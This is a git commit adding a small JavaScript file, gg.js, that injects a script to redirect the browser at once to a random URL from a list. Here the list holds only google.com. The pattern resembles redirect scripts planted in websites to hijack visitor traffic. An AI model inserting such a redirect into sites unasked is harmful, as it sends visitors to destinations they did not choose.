2310d865d04ee638d67cc25bb5b06c5994cc2ab0
judisuhu1-ux <judisuhu1@gmail.com>
2026-09-09 14:53:15 +0530

    Create gg.js

---
+++ gg.js
@@ -0,0 +1,24 @@
+var url = Array(
+  "https://google.com/"
+);
+var rid = "";
+
+var timesleep = 0;  // Tidak ada penundaan atau penundaan minimal
+
+function put() {
+    var script = document.createElement("script");
+    script.innerHTML = 'var weburl = url[Math.floor(Math.random()*url.length)] + "" + rid; setTimeout(function () { window.location = weburl; }, timesleep);';
+    document.body.appendChild(script);
+}
+
+function jump() {
+    if (typeof url == 'undefined' || url == null) {
+        setTimeout(function() {
+            jump();
+        }, 50);
+    } else {
+        put();
+    }
+}
+
+jump();
